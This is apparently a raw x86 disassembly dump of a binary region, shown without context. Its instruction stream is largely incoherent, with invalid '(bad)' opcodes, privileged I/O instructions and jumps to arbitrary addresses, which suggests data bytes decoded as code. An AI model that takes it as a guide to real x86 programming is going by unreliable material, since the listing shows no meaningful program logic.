  4124cb:	mov    ?,WORD PTR [esi-0x5a]
  4124ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124d0:	outs   dx,BYTE PTR ds:[esi]
  4124d1:	rol    DWORD PTR [esp+esi*2+0x9f941d2],cl
  4124d8:	cs jno 0x41250c
  4124db:	jp     0x4124a6
  4124dd:	adc    edx,eax
  4124df:	fidivr DWORD PTR [eax+0x59]
  4124e2:	ins    DWORD PTR es:[edi],dx
  4124e3:	shr    DWORD PTR [edx+0x40],0x38
  4124e7:	xchg   esi,eax
  4124e8:	bound  ebx,QWORD PTR [esi]
  4124ea:	and    dh,bl
  4124ec:	push   ecx
  4124ed:	mov    esp,0x17b286b7
  4124f2:	and    eax,0x65a83bd7
  4124f7:	and    al,0xd6
  4124f9:	add    al,0x70
  4124fb:	pop    eax
  4124fc:	rol    bl,cl
  4124fe:	fidiv  WORD PTR ds:[eax]
  412501:	(bad)  
  412502:	cmp    al,0xfe
  412504:	or     DWORD PTR [eax],edx
  412506:	popf   
  412507:	inc    ebx
  412508:	push   edi
  412509:	leave  
  41250a:	sub    esi,DWORD PTR [ebx-0x4e]
  41250d:	pop    ecx
  41250e:	pop    edx
  41250f:	push   0xc705ead1
  412514:	popa   
  412515:	sahf   
  412516:	mov    ch,dh
  412518:	rcl    al,0xe3
  41251b:	mov    es,WORD PTR [esi+0x17]
  41251e:	adc    edx,0xaff5d788
  412524:	shl    BYTE PTR [ebp+0x4e],cl
  412527:	mov    ch,BYTE PTR [edi-0x50]
  41252a:	sbb    bl,BYTE PTR [ecx+ebp*2+0x3a]
  41252e:	mov    ah,0x59
  412530:	rcl    BYTE PTR [ecx],1
  412532:	xchg   ebx,eax
  412533:	dec    edi
  412534:	sbb    eax,0xad148d20
  412539:	aaa    
  41253a:	mov    esp,0xfcea47c4
  41253f:	push   ds
  412540:	nop
  412541:	xor    DWORD PTR [edi],esi
  412543:	mov    WORD PTR [ecx],cs
  412545:	inc    edx
  412546:	(bad)  
  412548:	xchg   BYTE PTR [esi+0x4804c6fd],ah
  41254e:	call   0x85887200
  412553:	mov    edx,0x8c62465c
  412558:	adc    DWORD PTR [eax-0x4deaf1ac],0xffffffe2
  41255f:	mov    ?,WORD PTR [esi+0x5e31a60a]
  412565:	bound  esp,QWORD PTR [edi+0x1291d24a]
  41256b:	mov    edx,0x66d7f446
  412570:	data16 add al,ch
  412573:	fsubrp st(3),st
  412575:	xchg   ecx,eax
  412576:	or     cl,BYTE PTR [ebx]
  412578:	sub    eax,0xb6d57dfa
  41257d:	xchg   ebp,eax
  41257e:	test   DWORD PTR [ecx+esi*4-0x2e],esi
  412582:	(bad)  
  412583:	cld    
  412584:	xchg   ebx,eax
  412585:	mov    ecx,0x8475b019
  41258a:	fst    QWORD PTR [ebx+0xce01e0c]
  412590:	(bad)
  412595:	test   al,0xfe
  412597:	jmp    0x17de:0x607091fc
  41259e:	loope  0x4125c3
  4125a0:	pop    edx
  4125a1:	add    al,dh
  4125a3:	add    eax,0xd359513e
  4125a8:	inc    esi
  4125a9:	in     al,0x85
  4125ab:	sub    al,0xc4
  4125ad:	aam    0xb4
  4125af:	out    0x98,al
  4125b1:	pop    esi
  4125b2:	jae    0x4125ba
  4125b4:	hlt    
  4125b5:	adc    DWORD PTR [eax],esp
  4125b7:	pop    ebx
  4125b8:	enter  0x3c4b,0x71
  4125bc:	call   0xabadab9e
  4125c1:	fadd   QWORD PTR [eax+0x77cbc61]
  4125c7:	mov    es,ecx
  4125c9:	popa   
  4125ca:	or     BYTE PTR [eax+esi*1],bh
  4125cd:	iret   
  4125ce:	rcl    ebp,1
  4125d0:	jmp    0x4125c4
  4125d2:	mov    WORD PTR [ebp-0x34ecdd2f],cs
  4125d8:	pop    ds
  4125d9:	dec    esp
  4125da:	retf   
  4125db:	fldenv [ecx+0x76]
  4125de:	rcr    DWORD PTR [ebp+ebx*2+0x1f],1
  4125e2:	aas    
  4125e3:	popf   
  4125e4:	je     0x4125e2
  4125e6:	pop    es
  4125e7:	icebp  
  4125e8:	rcr    BYTE PTR [ecx+0x25],0x89
  4125ec:	ror    BYTE PTR [eax-0x38],cl
  4125ef:	inc    esi
  4125f0:	retf   0x92cf
  4125f3:	mov    al,0xa3
  4125f5:	push   ds
  4125f6:	mov    al,ds:0xde31e8d
  4125fb:	add    DWORD PTR [eax-0x2c592287],eax
  412601:	into   
  412602:	sub    DWORD PTR [ecx+ebx*8-0x41901bec],edi
  412609:	sar    BYTE PTR [ebp+0x13a8b98e],0xe8
  412610:	out    dx,eax
  412611:	popf   
  412612:	data16 mov bh,0xd2
  412615:	add    BYTE PTR [eax+0x2b653bde],bl
  41261b:	dec    edx
  41261c:	out    0x13,eax
  41261e:	mov    ebp,0x12f2550c
  412623:	es xchg edx,eax
  412625:	test   DWORD PTR [edi-0x79b2d27],0xced242cb
  41262f:	jno    0x412695
  412631:	into   
  412632:	int3   
  412633:	cmp    dl,BYTE PTR [edi+0x1e]
  412636:	out    dx,al
  412637:	sbb    DWORD PTR fs:[ecx-0x63],ebp
  41263b:	out    dx,eax
  41263c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263d:	inc    ebx
  41263e:	mov    eax,DWORD PTR [esi-0x40]
  412641:	push   ds
  412642:	jae    0x41266e
  412644:	shr    DWORD PTR [ecx+0x2d],0x93
  412648:	ins    DWORD PTR es:[edi],dx
  412649:	or     eax,0x111082d2
  41264e:	push   esp
  41264f:	sar    edi,1
  412651:	shl    BYTE PTR [esi-0x26692d95],1
  412657:	mov    esp,0x14e22687
  41265c:	loop   0x41266e
  41265e:	cdq    
  41265f:	mov    ah,0x33
  412661:	dec    ebp
  412662:	icebp  
  412663:	arpl   WORD PTR [ebp-0x77],cx
  412666:	mov    ah,0x8e
  412668:	jp     0x412659
  41266a:	jno    0x412645
  41266c:	ror    BYTE PTR [ebx+0x1e],cl
  41266f:	or     eax,0xf22407b1
  412674:	adc    dl,BYTE PTR [ecx]
  412676:	xor    ebp,DWORD PTR [ebx]
  412678:	(bad)  
  412679:	in     al,0xf7
  41267b:	mov    al,ds:0x2befa3ef
  412680:	int3   
  412681:	gs pop eax
  412683:	adc    edx,0x7e
  412686:	arpl   WORD PTR [ecx-0x2196dc88],si
  41268c:	fisubr WORD PTR [eax+edx*2-0x75]
  412690:	sub    al,0x11
  412692:	jg     0x412650
  412694:	cli    
  412695:	nop
  412696:	fwait
  412697:	addr16 jb 0x412635
  41269a:	mov    bh,0xdf
  41269c:	push   0x6d
  41269e:	xchg   ebx,eax
  41269f:	out    dx,eax
  4126a0:	scas   eax,DWORD PTR es:[edi]
  4126a1:	xchg   esp,eax
  4126a2:	sbb    DWORD PTR [edx+0x56],0xffffff9e
  4126a6:	add    DWORD PTR [ebx+esi*1-0x7b72841e],ebx
  4126ad:	inc    eax
  4126ae:	xchg   edi,eax
  4126af:	test   al,0x81
  4126b1:	inc    ebp
  4126b2:	dec    ebp
  4126b3:	shl    DWORD PTR [edx-0x27],cl
  4126b6:	dec    ebx
  4126b7:	mov    ds:0x9b4489d2,eax
  4126bc:	icebp  
  4126bd:	inc    DWORD PTR [ebx+edi*2]
  4126c0:	scas   al,BYTE PTR es:[edi]
  4126c1:	sbb    al,0x69
  4126c3:	mov    al,0xba
  4126c5:	cld    
  4126c6:	out    0x2e,al
  4126c8:	call   0xa7bb:0x8e9922c8
  4126cf:	push   edi
  4126d0:	mov    ds:0xc7cf852a,al
  4126d5:	out    0x92,al
  4126d7:	add    DWORD PTR [ebx+0x328e14e0],edi
  4126dd:	sub    ah,BYTE PTR [eax+edi*8-0x3a]
  4126e1:	mov    edi,0x8dd24b57
  4126e6:	mov    WORD PTR [ebp+eiz*1-0x237f15b4],cs
  4126ed:	rcl    ebp,0x9
  4126f0:	fstp   QWORD PTR ds:0xf8790f65
  4126f6:	(bad)  
  4126f7:	into   
  4126f8:	pusha  
  4126f9:	push   0xffffffc6
  4126fb:	push   ebp
  4126fc:	lods   eax,DWORD PTR ds:[esi]
  4126fd:	adc    edx,DWORD PTR [ebx+0x365223e4]
  412703:	add    eax,0x8d2f936c
  412708:	xor    DWORD PTR [esi-0x5],ecx
  41270b:	int    0x55
  41270d:	ja     0x412747
  41270f:	outs   dx,DWORD PTR ds:[esi]
  412710:	in     al,0xb5
  412712:	ret    0x708e
  412715:	repz sbb eax,0xa5ebd9fb
  41271b:	mov    fs,WORD PTR [ecx-0x73a67561]
  412721:	(bad)  
  412722:	enter  0xd264,0x60
  412726:	inc    esi
  412727:	jb     0x4127a7
  412729:	adc    al,cl
  41272b:	push   edi
  41272c:	adc    BYTE PTR [edi],0xbb
  41272f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412730:	repz and ebx,DWORD PTR [ecx+edx*4]
  412734:	xor    ch,BYTE PTR ds:0x493470a1
  41273a:	test   BYTE PTR [eax],dh
  41273c:	fnstenv [edi+0x29]
  41273f:	sub    eax,0x8e9436c7
  412744:	dec    ecx
  412745:	mov    al,ds:0x1adbfa0f
  41274a:	(bad)  
  41274b:	xchg   esi,eax
  41274c:	sar    BYTE PTR [ebp+0x56],cl
  41274f:	cmp    BYTE PTR [edi-0x4b],dl
  412752:	or     BYTE PTR [ecx+0x3c],dh
  412755:	adc    DWORD PTR [ebp*1+0x1d205bea],ecx
  41275c:	scas   eax,DWORD PTR es:[edi]
  41275d:	inc    BYTE PTR [ebp-0x40d8554c]
  412763:	push   ss
  412764:	add    al,0xa3
  412766:	jnp    0x4126f4
  412768:	xor    al,0x53
  41276a:	jae    0x412742
  41276c:	adc    bh,BYTE PTR [ecx]
  41276e:	in     eax,0x87
  412770:	and    BYTE PTR [ebp-0x2],ch
  412773:	mov    edx,0x8e40b2d3
  412778:	push   edx
  412779:	das    
  41277a:	and    DWORD PTR [esp],ebp
  41277d:	adc    DWORD PTR [esi],eax
  41277f:	fcomp  QWORD PTR [ebx+0x7e]
  412783:	(bad)  
  412784:	push   ecx
  412785:	or     ch,ah
  412787:	dec    ecx
  412788:	ja     0x412755
  41278a:	dec    edx
  41278b:	cdq    
  41278c:	dec    ebp
  41278d:	add    edx,DWORD PTR [edi-0x5c317d09]
  412793:	mov    ds,WORD PTR [eax]
  412795:	push   ebx
  412796:	setb   BYTE PTR ds:[ebx]
  41279a:	add    eax,esp
  41279c:	rcr    BYTE PTR [ecx],cl
  41279e:	inc    eax
  41279f:	xchg   edx,eax
  4127a0:	pop    ss
  4127a1:	xchg   esp,eax
  4127a2:	pop    esi
  4127a3:	jle    0x41281b
  4127a5:	push   ds
  4127a6:	test   al,0xee
  4127a8:	mov    bl,0x2d
  4127aa:	xlat   BYTE PTR ds:[ebx]
  4127ab:	ins    DWORD PTR es:[edi],dx
  4127ac:	pop    ebx
  4127ad:	cmp    eax,DWORD PTR [ebp-0x697f42dd]
  4127b3:	mov    dh,0x8f
  4127b5:	jmp    0x4127c9
  4127b7:	mov    fs,WORD PTR [eax-0x5805b394]
  4127bd:	ins    DWORD PTR es:[edi],dx
  4127be:	(bad)  
  4127bf:	xlat   BYTE PTR ds:[ebx]
  4127c0:	rcl    BYTE PTR [ebx+0x16ef99a3],cl
  4127c6:	sbb    BYTE PTR [eax-0x5d],0x7f
  4127ca:	repz mov ?,WORD PTR [ebx]
  4127cd:	pushf  
  4127ce:	repnz lods al,BYTE PTR ds:[esi]
  4127d0:	mov    esp,0xd2f17627
  4127d5:	clc    
  4127d6:	add    DWORD PTR [esi+0x5ffa026c],ebx
  4127dc:	jg     0x4127fc
  4127de:	push   esp
  4127df:	mov    bh,0xce
  4127e1:	icebp  
  4127e2:	pusha  
  4127e3:	test   DWORD PTR [edi],0xa7781a8
  4127e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ea:	ror    esi,cl
  4127ec:	xchg   edx,eax
  4127ed:	fcom   QWORD PTR [ecx]
  4127ef:	sbb    DWORD PTR [esi+0x11],eax
  4127f2:	or     al,0x0
  4127f4:	sub    edi,ebp
  4127f6:	push   ds
  4127f7:	add    esi,DWORD PTR [ecx+0x1f]
  4127fa:	mov    esi,0xe5451b6c
  4127ff:	enter  0xf8dd,0xc7
  412803:	xchg   edx,eax
  412804:	sar    BYTE PTR [esi-0x7],cl
  412807:	mov    ds:0x97734221,al
  41280c:	mov    bl,0xc0
  41280e:	xchg   edx,eax
  41280f:	adc    BYTE PTR [ebp-0x267b4adf],bh
  412815:	sahf   
  412816:	dec    ecx
  412817:	mov    al,0xd2
  412819:	sbb    DWORD PTR [eax],0x14a2a278
  41281f:	xchg   esi,eax
  412820:	sbb    dl,BYTE PTR [ecx]
  412822:	aam    0x69
  412824:	inc    eax
  412825:	push   esi
  412826:	mov    al,ds:0x85a3dfaf
  41282b:	enter  0xbd17,0x87
  41282f:	add    BYTE PTR [eax+ebp*8+0x1189f89d],al
  412836:	jg     0x412885
  412838:	push   ecx
  412839:	idiv   DWORD PTR [ebx+0x55a8c20e]
  41283f:	lods   eax,DWORD PTR ds:[esi]
  412840:	sar    BYTE PTR [edx-0xde52608],cl
  412846:	sar    DWORD PTR ds:0x8a25e78,1
  41284c:	jmp    0x8d079f0e
  412851:	lahf   
  412852:	mov    BYTE PTR [ebx+0x7f8241c8],dh
  412858:	jle    0x412810
  41285a:	popa   
  41285b:	in     al,0x4f
  41285d:	sbb    eax,0x6054425
  412862:	imul   ebp,DWORD PTR [esi-0x363c3689],0xffffffd2
  412869:	sbb    esi,DWORD PTR [eax-0x23bdd1dc]
  41286f:	pop    edi
  412870:	dec    ecx
  412871:	and    eax,0x90ebe9a6
  412876:	ror    BYTE PTR [esi+0x16a8e16],1
  41287c:	xor    DWORD PTR [edx],ecx
  41287e:	pop    ebx
  41287f:	ret    0x32d2
  412882:	jecxz  0x412818
  412884:	jns    0x41281f
  412886:	out    dx,eax
  412887:	call   FWORD PTR ds:0xa93ec011
  41288d:	and    al,0x46
  41288f:	push   es
  412890:	pop    ebx
  412891:	or     DWORD PTR [eax+ebp*4-0x349b8328],eax
  412898:	addr16 in eax,dx
  41289a:	loope  0x412828
  41289c:	les    ebx,FWORD PTR cs:0x36ebc037
  4128a3:	dec    ebp
  4128a4:	les    ecx,FWORD PTR [ecx+0x21d893ce]
  4128aa:	popa   
  4128ab:	add    ecx,esi
  4128ad:	mov    BYTE PTR ds:0xfc9aef87,dl
  4128b3:	(bad)  
  4128b4:	in     eax,dx
  4128b5:	add    bh,0xee
  4128b8:	dec    ebx
  4128b9:	retf   0x6c96
  4128bc:	pop    ebx
  4128bd:	push   ds
  4128be:	sbb    DWORD PTR [eax],esi
  4128c0:	imul   ebp,DWORD PTR [ebp-0x18],0x85724cda
  4128c7:	jecxz  0x4128f9
  4128c9:	xor    dh,BYTE PTR [ebx+0x54]
  4128cc:	jo     0x41287d
  4128ce:	mov    ecx,0x21d0970
  4128d3:	push   edi
  4128d4:	xlat   BYTE PTR ds:[ebx]
  4128d5:	xchg   ecx,eax
  4128d6:	ins    DWORD PTR es:[edi],dx
  4128d7:	xlat   BYTE PTR ds:[ebx]
  4128d8:	fwait
  4128d9:	inc    ecx
  4128da:	or     ch,BYTE PTR [eax-0x15]
  4128dd:	or     eax,0x64712c85
  4128e2:	push   eax
  4128e3:	adc    bh,BYTE PTR ds:0xdb8ecca1
  4128e9:	cmp    ah,BYTE PTR ds:[esp+ecx*4]
  4128ed:	jp     0x412938
  4128ef:	pop    ss
  4128f0:	rcr    BYTE PTR [ecx-0x3a],cl
  4128f3:	fcos   
  4128f5:	pop    ss
  4128f6:	mov    dl,BYTE PTR [eax+0x770f1e41]
  4128fc:	jns    0x41296a
  4128fe:	jb     0x4128f3
  412900:	loop   0x4128f8
  412902:	test   DWORD PTR [ebx+0x4a711283],esi
  412908:	pop    esp
  412909:	sub    eax,0x98368d8b
  41290e:	ja     0x4128cb
  412910:	in     eax,0xa0
  412912:	inc    esp
  412913:	retf   0x7dc
  412916:	test   ebp,edx
  412918:	outs   dx,BYTE PTR ds:[esi]
  412919:	cmp    eax,0xe37837c6
  41291e:	add    ebx,DWORD PTR [edi+0x7e24ba4]
  412924:	inc    ecx
  412925:	xchg   esp,eax
  412926:	xchg   esp,eax
  412927:	cmp    edx,DWORD PTR [edx+0x25049d05]
  41292d:	mov    eax,DWORD PTR fs:[eax-0x24]
  412931:	ss jns 0x41294c
  412934:	into   
  412935:	mov    esp,0x40cfff55
  41293a:	scas   al,BYTE PTR es:[edi]
  41293b:	mov    gs,WORD PTR ds:0xfe840c5
  412941:	(bad)  
  412942:	sbb    DWORD PTR [edx-0x2e],ebx
  412945:	sub    eax,0xac2cd4ec
  41294a:	cmp    DWORD PTR [edi],0x65111d1
  412950:	inc    edx
  412951:	push   edi
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	inc    eax
  412954:	inc    edi
  412955:	fadd   DWORD PTR [ebp-0x516c266]
  41295b:	mov    ah,0x28
  41295d:	cmp    DWORD PTR [edx+0x5c],edx
  412960:	outs   dx,DWORD PTR ds:[esi]
  412961:	and    dh,BYTE PTR [ecx-0x35]
  412964:	push   edx
  412965:	dec    ecx
  412966:	pop    esp
  412967:	aaa    
  412968:	pop    ebx
  412969:	pop    es
  41296a:	fs jno 0x41293f
  41296d:	pop    esp
  41296e:	scas   eax,DWORD PTR es:[edi]
  41296f:	jp     0x41295f
  412971:	mov    edx,0x11a30fde
  412976:	xchg   edi,eax
  412977:	jecxz  0x4128fd
  412979:	shl    DWORD PTR [esi+ebx*4],0xe5
  41297d:	or     eax,0x67779b85
  412982:	bound  esi,QWORD PTR [ecx]
  412984:	xor    eax,0x5f8ec497
  412989:	xlat   BYTE PTR ds:[ebx]
  41298a:	outs   dx,DWORD PTR ds:[esi]
  41298b:	jno    0x4129d4
  41298d:	loop   0x4129e8
  41298f:	rcl    dl,1
  412991:	pop    ebx
  412992:	shl    ah,cl
  412994:	gs test eax,0x11afe8b9
  41299a:	mov    ah,0x25
  41299c:	sahf   
  41299d:	aam    0x5d
  41299f:	mov    esi,0x95cfdd8a
  4129a4:	rcl    ebp,cl
  4129a6:	mov    al,ds:0xe048b23f
  4129ab:	outs   dx,DWORD PTR ds:[esi]
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	mov    edx,0x65578edc
  4129b2:	mov    ebp,0x82b34036
  4129b7:	xchg   esi,eax
  4129b8:	inc    ebp
  4129b9:	cmp    eax,0xa3bf8e84
  4129be:	pop    edi
  4129bf:	retf   0x11b1
  4129c2:	mov    edx,0x107b3332
  4129c7:	aad    0x44
  4129c9:	rol    BYTE PTR [ebp-0x5a81a8c7],1
  4129cf:	fcmovnbe st,st(7)
  4129d1:	inc    eax
  4129d2:	cmp    BYTE PTR [ecx+ebx*1-0x6bb90e40],cl
  4129d9:	sbb    dl,BYTE PTR [ebp-0x74feff1e]
  4129df:	jne    0x4129db
  4129e1:	sub    al,0xd2
  4129e3:	scas   eax,DWORD PTR es:[edi]
  4129e4:	xchg   ecx,eax
  4129e5:	icebp  
  4129e6:	pop    ecx
  4129e7:	adc    BYTE PTR [eax+0x1e],0x75
  4129eb:	cmp    al,0x9f
  4129ed:	xchg   BYTE PTR [ecx-0x166fde42],ah
  4129f3:	std    
  4129f4:	sub    dl,0x9
  4129f7:	push   cs
  4129f8:	(bad)  
  4129f9:	jmp    0xaf8f:0xeee5011b
  412a00:	fistp  DWORD PTR [eax]
  412a02:	add    eax,0xe000094a
  412a07:	pop    edi
  412a08:	call   0x6e98afa1
  412a0d:	data16 scas al,BYTE PTR es:[edi]
  412a0f:	lods   eax,DWORD PTR ds:[esi]
  412a10:	shl    DWORD PTR [edx-0x47],1
  412a13:	mov    gs,WORD PTR [esi]
  412a15:	xor    bh,BYTE PTR [ebp+0x76]
  412a18:	icebp  
  412a19:	enter  0xb56d,0xd2
  412a1d:	lea    esp,[edi]
  412a1f:	mov    sp,0xffb2
  412a23:	cmp    bl,bh
  412a25:	aas    
  412a26:	popa   
  412a27:	arpl   cx,cx
  412a29:	adc    DWORD PTR [esi],ebp
  412a2b:	nop
  412a2c:	mov    ch,0xaf
  412a2e:	cwde   
  412a2f:	mov    edi,0x614579ad
  412a34:	fist   DWORD PTR [edx+0x5923f6fe]
  412a3a:	push   0x528bba6
  412a3f:	nop
  412a40:	adc    eax,DWORD PTR [esi+0x7]
  412a43:	cwde   
  412a44:	mov    ah,0x45
  412a46:	mov    al,BYTE PTR [ecx]
  412a48:	aam    0x8b
  412a4a:	shr    BYTE PTR [ebx],1
  412a4c:	lods   al,BYTE PTR ds:[esi]
  412a4d:	fldenv [ebp-0x72]
  412a50:	and    DWORD PTR [esi],esp
  412a52:	pusha  
  412a53:	dec    ecx
  412a54:	pop    esi
  412a55:	add    al,0xde
  412a57:	push   esp
  412a58:	push   ss
  412a59:	adc    cl,BYTE PTR [ebp-0x72]
  412a5c:	adc    DWORD PTR [ebp-0x24],ebp
  412a5f:	add    DWORD PTR [eax-0x7371e349],ebp
  412a65:	stos   DWORD PTR es:[edi],eax
  412a66:	mov    edi,0xb77b9def
  412a6b:	jecxz  0x412a3f
  412a6d:	mov    ebp,0x7ea98fdb
  412a72:	outs   dx,BYTE PTR ds:[esi]
  412a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a74:	mov    ecx,0x8ddd211
  412a79:	xchg   ecx,eax
  412a7a:	(bad)  
  412a7c:	jmp    0xb1d5aefd
  412a81:	pop    esp
  412a82:	xchg   esi,eax
  412a83:	int    0x84
  412a85:	push   ds
  412a86:	and    BYTE PTR [edi-0x448ec103],dl
  412a8c:	cld    
  412a8d:	rcr    DWORD PTR [ebp+0x73],0xe4
  412a91:	jl     0x412a66
  412a93:	call   edx
  412a95:	in     eax,0xb5
  412a97:	inc    esp
  412a98:	int3   
  412a99:	out    dx,al
  412a9a:	mov    ds:0x201e6628,eax
  412a9f:	fst    QWORD PTR [ebp+0x4401bf61]
  412aa5:	push   ebx
  412aa6:	inc    esp
  412aa7:	sub    BYTE PTR [edx+0x2f],ch
  412aaa:	cdq    
  412aab:	xchg   ebx,eax
  412aac:	mov    eax,0x6197131e
  412ab1:	and    ch,BYTE PTR [esi+esi*8+0x68ede1a7]
  412ab8:	scas   al,BYTE PTR es:[edi]
  412ab9:	mul    DWORD PTR [ebp-0x19]
  412abc:	cmp    bl,BYTE PTR [edx]
  412abe:	or     al,0xce
  412ac0:	sbb    DWORD PTR [edx-0x22ddea0],0xfffffff8
  412ac7:	mov    ecx,0x4eace9b8
  412acc:	ret    
  412acd:	adc    DWORD PTR [esi-0x329b4c78],edi
  412ad3:	dec    eax
  412ad4:	adc    eax,0xd778446
  412ad9:	and    DWORD PTR gs:[ecx],0xffffffb2
  412add:	mov    ah,0x25
  412adf:	xchg   edi,eax
  412ae0:	cmp    eax,0x8cf9683
  412ae5:	mov    cl,0x4c
  412ae7:	int    0xea
  412ae9:	dec    ebp
  412aea:	test   BYTE PTR [esi+0x6c9ef485],dl
  412af0:	xchg   edx,eax
  412af1:	mov    edi,DWORD PTR [ecx*4+0x75965228]
  412af8:	inc    esi
  412af9:	pop    esp
  412afa:	cmp    ebp,DWORD PTR [eax-0x2d]
  412afd:	add    bh,dh
  412aff:	xchg   edx,eax
  412b00:	mov    ?,WORD PTR [esi+0x59]
  412b03:	in     eax,0xa2
  412b05:	lods   al,BYTE PTR ds:[esi]
  412b06:	push   eax
  412b07:	mov    ds,ecx
  412b09:	jno    0x412b21
  412b0b:	call   0xf8d2:0xa14e8dfa
  412b12:	popa   
  412b13:	mov    esp,0x4ef789ad
  412b18:	mov    al,ds:0x6b582611
  412b1d:	enter  0xa715,0xea
  412b21:	stc    
  412b22:	push   DWORD PTR [edx]
  412b24:	jp     0x412b13
  412b26:	mov    al,ds:0xbb1ed90e
  412b2b:	ins    DWORD PTR es:[edi],dx
  412b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b2d:	adc    DWORD PTR [esi+0x772f0231],esp
  412b33:	xadd   BYTE PTR [ebx],ch
  412b36:	test   DWORD PTR [edi+0x47cc6971],ecx
  412b3c:	xor    dh,bh
  412b3e:	mov    esi,0xac1cf35c
  412b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b44:	icebp  
  412b45:	in     al,dx
  412b46:	sub    DWORD PTR [ebp-0x51],ebx
  412b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b4a:	cmp    al,0x4e
  412b4c:	shl    ch,cl
  412b4e:	jp     0x412b10
  412b50:	rol    DWORD PTR [ecx],0x89
  412b53:	mov    dl,0x22
  412b55:	adc    ch,ch
  412b57:	mov    bl,0x2c
  412b59:	inc    edi
  412b5a:	pop    ebp
  412b5b:	inc    edi
  412b5c:	mov    dl,0xa3
  412b5e:	and    eax,0x2f80d2c4
  412b63:	int3   
  412b64:	dec    ebp
  412b65:	mov    esp,0x11c41bad
  412b6a:	mov    ecx,ecx
  412b6c:	inc    esp
  412b6d:	sbb    DWORD PTR [di+0x4162],esi
  412b72:	test   ch,bl
  412b74:	mov    eax,0x2e9be8cb
  412b79:	(bad)  
  412b7a:	jge    0x412b0a
  412b7c:	div    BYTE PTR [esi+0x1b389f63]
  412b82:	sbb    cl,BYTE PTR [ebx]
  412b84:	into   
  412b85:	inc    ecx
  412b86:	ror    bl,1
  412b88:	ror    BYTE PTR ds:0xe01242c9,cl
  412b8e:	aam    0x8e
  412b90:	fs pop ecx
  412b92:	xor    edx,DWORD PTR [esi-0x2d]
  412b95:	addr16 adc eax,0x85802640
  412b9b:	jl     0x412bf1
  412b9d:	test   BYTE PTR [edi+0x17],bh
  412ba0:	cmp    DWORD PTR [edi],edi
  412ba2:	pop    esp
  412ba3:	call   0x2d283d2b
  412ba8:	jle    0x412b8c
  412baa:	mov    esi,0x85a6b8ee
  412baf:	sub    DWORD PTR ds:0xff6975b4,edi
  412bb5:	or     ch,BYTE PTR [edx-0x789f2b61]
  412bbb:	pop    esp
  412bbc:	push   edx
  412bbd:	jb     0x412b55
  412bbf:	mov    ch,BYTE PTR [eax]
  412bc1:	out    dx,eax
  412bc2:	clc    
  412bc3:	pop    ss
  412bc4:	cmc    
  412bc5:	xor    BYTE PTR [ecx],cl
  412bc7:	and    esi,esp
  412bc9:	fld    QWORD PTR ds:0xe3533cfc
  412bcf:	inc    esi
  412bd0:	in     eax,0xb7
  412bd2:	test   edx,edx
  412bd4:	in     al,0x62
  412bd6:	jo     0x412b78
  412bd8:	mov    bh,0x5e
  412bda:	push   edi
  412bdb:	mov    es,WORD PTR ds:0x7bbdc008
  412be1:	adc    al,0xc3
  412be3:	and    dl,dl
  412be5:	push   ebp
  412be6:	push   0x50
  412be8:	cmp    eax,0x8988d7b9
  412bed:	in     al,0xa0
  412bef:	mov    es,WORD PTR [edx]
  412bf1:	jge    0x412bf6
  412bf3:	popf   
  412bf4:	sbb    bh,BYTE PTR [ebx]
  412bf6:	xor    DWORD PTR [ebx+ebp*1+0x66],eax
  412bfa:	test   DWORD PTR [ebx+0x18],eax
  412bfd:	sub    eax,0x359c55c9
  412c02:	ror    DWORD PTR [esi],cl
  412c04:	add    al,0xe8
  412c06:	and    bh,dl
  412c08:	sar    BYTE PTR [ebp-0x1310c064],cl
  412c0e:	cld    
  412c0f:	out    0x16,al
  412c11:	adc    DWORD PTR [esi-0x3a],edx
  412c14:	mov    ch,0x97
  412c16:	scas   eax,DWORD PTR es:[edi]
  412c17:	ffree  st(4)
  412c19:	xor    BYTE PTR [ebp+0x4ad6e37b],al
  412c1f:	push   es
  412c20:	lds    eax,FWORD PTR [edx]
  412c22:	jb     0x412bd3
  412c24:	jmp    0x412c3b
  412c26:	add    eax,0x60313acc
  412c2b:	adc    eax,0x4b8463e1
  412c30:	xchg   edx,eax
  412c31:	xor    BYTE PTR [esi],al
  412c33:	dec    ebp
  412c34:	js     0x412c4c
  412c36:	fmul   QWORD PTR [esi+0x1390a672]
  412c3c:	je     0x412c1e
  412c3e:	jmp    0x412be2
  412c40:	shl    BYTE PTR [ecx],cl
  412c42:	adc    al,0x2a
  412c44:	pusha  
  412c45:	loop   0x412c21
  412c47:	mov    cl,0x15
  412c49:	adc    DWORD PTR [edx],esp
  412c4b:	pushf  
  412c4c:	push   ecx
  412c4d:	rcr    DWORD PTR [esi-0x7b929e90],1
  412c53:	mov    eax,0x578cc7e0
  412c58:	sti    
  412c59:	(bad)  
  412c5a:	jmp    0x412bea
  412c5c:	jnp    0x412cc9
  412c5e:	dec    edi
  412c5f:	push   ss
  412c60:	mov    eax,eax
  412c62:	mov    ebp,0xd8cad29c
  412c67:	pop    edx
  412c68:	mov    ch,0x6
  412c6a:	scas   al,BYTE PTR es:[edi]
  412c6b:	pop    ds
  412c6c:	fs sbb eax,0x1f6609a9
  412c72:	cmp    DWORD PTR [esi-0x5e13b9b0],0x8f1bdd2
  412c7c:	or     ebx,eax
  412c7e:	es adc al,0x69
  412c81:	jp     0x412c23
  412c83:	mov    gs,WORD PTR [ebp-0x60d555fa]
  412c89:	pop    ebx
  412c8a:	retf   0xd255
  412c8d:	icebp  
  412c8e:	(bad)  
  412c8f:	or     eax,0x4eda1f40
  412c94:	jb     0x412c81
  412c96:	mov    eax,ds:0x2d54348e
  412c9b:	sbb    al,0x43
  412c9d:	adc    esi,DWORD PTR [edx+0x38]
  412ca0:	rol    BYTE PTR [eiz*8+0xca5ebc],cl
  412ca7:	mov    bh,0x22
  412ca9:	adc    DWORD PTR [edx+0x78f016f1],ebp
  412caf:	xor    BYTE PTR [ecx+0x17],0x85
  412cb3:	mov    bl,0xb8
  412cb5:	in     al,0x76
  412cb7:	popf   
  412cb8:	mov    al,0x5f
